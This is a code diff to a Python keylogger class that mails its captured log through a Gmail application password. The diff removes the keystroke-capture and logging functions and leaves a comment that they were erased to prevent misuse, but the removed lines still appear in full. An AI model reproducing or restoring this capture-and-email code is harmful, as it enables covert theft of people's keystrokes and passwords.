@@ -10,23 +10,7 @@ class KeyLogger:
         self.password = "generated_application_password_from_gmail_account"
 
 
-    def append_to_log(self, string):
-        assert isinstance(string, str)
-        self.log += string
-
-    def on_press(self, key):
-        try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = " "
-            elif key == key.esc:
-                self.send_mail("\n\n" + self.log)
-                print("Exiting program...")
-                return False
-            else:
-                current_key = " " + str(key) + " "
-        self.append_to_log(current_key)
+    # *some lines of code have been erased due to prevention of misuse'
 
     def send_mail(self, message):
         try:
